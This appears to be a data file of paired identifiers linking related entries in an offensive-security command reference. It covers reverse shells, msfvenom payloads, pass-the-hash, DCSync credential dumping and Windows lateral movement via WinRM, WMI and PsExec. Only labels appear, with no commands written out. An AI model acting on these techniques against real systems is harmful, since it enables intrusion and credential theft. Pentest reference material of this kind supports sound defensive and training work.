"winrm-enter-pssession","winrm-new-pssession"
"winrm-enter-pssession","winrm-invoke-command"
"winrm-enter-pssession","evil-winrm-creds"
"winrm-new-pssession","winrm-enter-pssession"
"winrm-new-pssession","winrm-invoke-command"
"winrm-invoke-command","winrm-new-pssession"
"winrm-invoke-command","evil-winrm-creds"
"winrm-invoke-command","wmi-invoke-method"
"winrm-winrs","winrm-invoke-command"
"winrm-winrs","evil-winrm-creds"
"evil-winrm-creds","evil-winrm-hash"
"evil-winrm-creds","winrm-enter-pssession"
"evil-winrm-creds","psexec-impacket-shell"
"evil-winrm-hash","evil-winrm-creds"
"evil-winrm-hash","psexec-impacket-shell"
"winrm-revshell-invoke","wmi-powershell-revshell"
"psexec-impacket-shell","psexec-sysinternals"
"psexec-impacket-shell","smbexec-impacket-fileless"
"psexec-impacket-shell","wmi-impacket-exec"
"psexec-impacket-shell","evil-winrm-creds"
"psexec-sysinternals","psexec-impacket-shell"
"psexec-sysinternals","psexec-sysinternals-interactive"
"psexec-sysinternals-interactive","psexec-sysinternals"
"smbexec-impacket-fileless","psexec-impacket-shell"
"smbexec-impacket-fileless","wmi-impacket-exec"
"smbexec-impacket-fileless","evil-winrm-creds"
"nc-listener-setup","socat-listener"
"bash-reverse-shell","python-reverse-shell"
"bash-reverse-shell","netcat-reverse-shell-mkfifo"
"msfvenom-windows-reverse-tcp","msfvenom-windows-meterpreter"
"msfvenom-linux-reverse-tcp","bash-reverse-shell"
"msfvenom-linux-reverse-tcp","python-reverse-shell"
"msfvenom-php-webshell","php-reverse-shell"
"netcat-reverse-shell-mkfifo","bash-reverse-shell"
"netcat-reverse-shell-mkfifo","python-reverse-shell"
"python-reverse-shell","bash-reverse-shell"
"python-reverse-shell","perl-reverse-shell"
"perl-reverse-shell","bash-reverse-shell"
"perl-reverse-shell","python-reverse-shell"
"php-reverse-shell","msfvenom-php-webshell"
"overpass-mimikatz-pth","overpass-rubeus-asktgt"
"passticket-mimikatz-inject","passticket-rubeus-ptt"
"passticket-mimikatz-inject","rubeus-ptt"
"passticket-rubeus-ptt","passticket-mimikatz-inject"
"overpass-rubeus-asktgt","overpass-mimikatz-pth"
"pth-mimikatz-sekurlsa","pth-impacket-psexec"
"pth-mimikatz-sekurlsa","pth-evil-winrm"
"pth-mimikatz-sekurlsa","pth-cme-spray"
"pth-impacket-psexec","pth-impacket-wmiexec"
"pth-impacket-psexec","pth-impacket-smbexec"
"pth-impacket-psexec","pth-evil-winrm"
"pth-impacket-wmiexec","pth-impacket-psexec"
"pth-impacket-wmiexec","pth-impacket-smbexec"
"pth-impacket-smbexec","pth-impacket-psexec"
"pth-impacket-smbexec","pth-impacket-wmiexec"
"pth-evil-winrm","pth-impacket-psexec"
"pth-evil-winrm","pth-impacket-wmiexec"
"pth-cme-spray","pth-impacket-psexec"
"pth-cme-exec","pth-impacket-psexec"
"impacket-psexec","impacket-smbexec"
"impacket-psexec","impacket-wmiexec"
"impacket-psexec","ad-pass-the-hash-impacket-psexec"
"impacket-smbexec","impacket-psexec"
"impacket-smbexec","impacket-wmiexec"
"impacket-wmiexec","impacket-psexec"
"impacket-wmiexec","impacket-smbexec"
"impacket-wmiexec","ad-pass-the-hash-impacket-wmiexec"
"impacket-secretsdump","ad-dcsync-secretsdump-user"
"impacket-secretsdump","ad-dcsync-secretsdump-all"
"impacket-secretsdump","crackmapexec-sam-dump"
"msf-set-option","msf-setg-option"
"msf-setg-option","msf-set-option"
"msf-db-import","msf-db-nmap"
"mysql-connect-basic","sqli-union-mysql-info"
"postgres-connect-basic","postgres-direct-connect"
"postgres-connect-basic","sqli-union-postgresql-info"
"msfvenom-linux-elf","msfvenom-linux-reverse-tcp"
"msfvenom-windows-exe","msfvenom-linux-reverse-tcp"
"searchsploit-cve-lookup","searchsploit"
"searchsploit-cve-lookup","searchsploit-service-version"
"searchsploit-service-version","searchsploit"
"searchsploit-service-version","searchsploit-cve-lookup"
"searchsploit-copy-exploit","searchsploit"
"searchsploit-copy-exploit","searchsploit-cve-lookup"
"searchsploit-copy-exploit","searchsploit-service-version"
"nmap-script-help","nmap-script-args"
"nmap-script-help","nmap-vuln-scan"
"nmap-script-args","nmap-script-help"
"nmap-script-args","nmap-vuln-scan"
"gobuster-dir-common","gobuster-dir-custom"
"gobuster-dir-common","gobuster-dir"
"gobuster-dir-custom","gobuster-dir-common"
"gobuster-dir-custom","gobuster-dir"
"nikto-comprehensive","nikto-scan"
"nikto-comprehensive","gobuster-dir-common"
"nikto-comprehensive","whatweb-technology-detection"
"dcom-mmc20-revshell","psexec-impacket-shell"
"dcom-shellbrowserwindow","dcom-shellwindows"
"msf-session-command","msf-session-interact"
"wmi-legacy-wmic","wmi-invoke-method"
"wmi-legacy-wmic","wmi-new-cimsession"
"wmi-legacy-wmic","wmi-impacket-exec"
"wmi-invoke-method","wmi-new-cimsession"
"wmi-invoke-method","wmi-impacket-exec"
"wmi-invoke-method","wmi-legacy-wmic"
"wmi-new-cimsession","wmi-invoke-method"
"wmi-new-cimsession","wmi-impacket-exec"
"wmi-impacket-exec","psexec-impacket-shell"
"wmi-impacket-exec","smbexec-impacket-fileless"
"wmi-impacket-exec","evil-winrm-shell"
"wmi-cme-exec","wmi-impacket-exec"
"mysql-connect-interactive","mysql-connect-basic"
"smbmap-enumerate-auth","smbmap-shares"
"smbmap-enumerate-auth","smbclient-connect"
"grep-metasploit-exploits","searchsploit-service-version"
"msfvenom-linux-x86-shell","msfvenom-linux-elf"
"msfvenom-linux-x64-meterpreter","msfvenom-linux-elf"
"msfvenom-windows-shell-tcp","msfvenom-windows-exe"
"msfvenom-windows-meterpreter-tcp","msfvenom-windows-exe"
"google-exploitdb-search","searchsploit-service-version"
"google-exploitdb-search","searchsploit-cve-lookup"
"whatweb-technology-id","curl-web-server-verify"
"nc-listener-non-staged","rlwrap-nc-listener"
"nc-listener-non-staged","msf-handler-setup"
"rlwrap-nc-listener","nc-listener-non-staged"
"ls-metasploit-auxiliary","msfconsole-search"
"msfvenom-windows-x64-meterpreter-tcp","msfvenom-windows-meterpreter-tcp"
"msfvenom-linux-x64-meterpreter-non-staged","msfvenom-linux-x64-meterpreter"
"msf-show-auxiliary","msf-search-auxiliary"
"meterpreter-getsystem","windows-exploit-suggester"
"msfvenom-php-reverse","php-reverse-shell"
"msfvenom-python-reverse","python-reverse-shell"
"msfvenom-bash-reverse","bash-reverse-shell"
